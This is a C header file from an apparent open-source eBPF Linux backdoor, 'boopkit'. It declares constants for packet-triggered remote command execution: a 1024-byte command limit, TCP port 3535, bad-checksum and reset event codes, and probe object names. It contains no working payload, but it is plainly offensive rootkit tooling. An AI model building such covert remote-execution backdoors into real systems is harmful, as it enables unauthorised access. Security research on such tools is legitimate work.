// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//

#ifndef BOOPKIT_BOOPKIT_H
#define BOOPKIT_BOOPKIT_H
#include <linux/types.h>

// MAX_RCE_SIZE is the maximum size of a boop command to execute.
#define MAX_RCE_SIZE 1024

#define EVENT_SRC_BAD_CSUM 1
#define EVENT_SRC_RECEIVE_RESET 2

// event_boop_t represents an event from the kernel.
//
// We will pass as much data up to userspace as possible.
// The convention is to not mutate the data in the eBPF probe
// but rather translate the data to userspace as quickly as possible.
//
// The userspace component will be responsible for making sense
// of whatever data is transferred in an event.
//
// NOTE: All event_boop_t fields MUST be used in a probe in order
// to pass the eBPF verifier!
struct event_boop_t {
  // saddr is 28 fucking bytes
  __u8 saddr[28];

  // an enumerated type of EVENT_SRC_* from above
  int event_src_code;
};

// PORT for the boopkit TCP protocol for boopscript RCE
#define PORT 3535

// MAX_DENY_ADDRS is the maximum amount of address that can be denied.
#define MAX_DENY_ADDRS 1024

// eBPF Probes
#define PROBE_BOOP "pr0be.boop.o"
#define PROBE_SAFE "pr0be.safe.o"
#define PROBE_XDP "pr0be.xdp.o"

// TIMEOUT_SECONDS_RECVRCE timeout seconds for recvrce()
#define TIMEOUT_SECONDS_RECVRCE 1

struct pkt_trace_metadata {
  __u32 ifindex;
  __u32 rx_queue;
  __u16 pkt_len;
  __u16 cap_len;
  __u16 flags;
  __u16 prog_index;
  int action;
} __packed;

#endif  // BOOPKIT_BOOPKIT_H
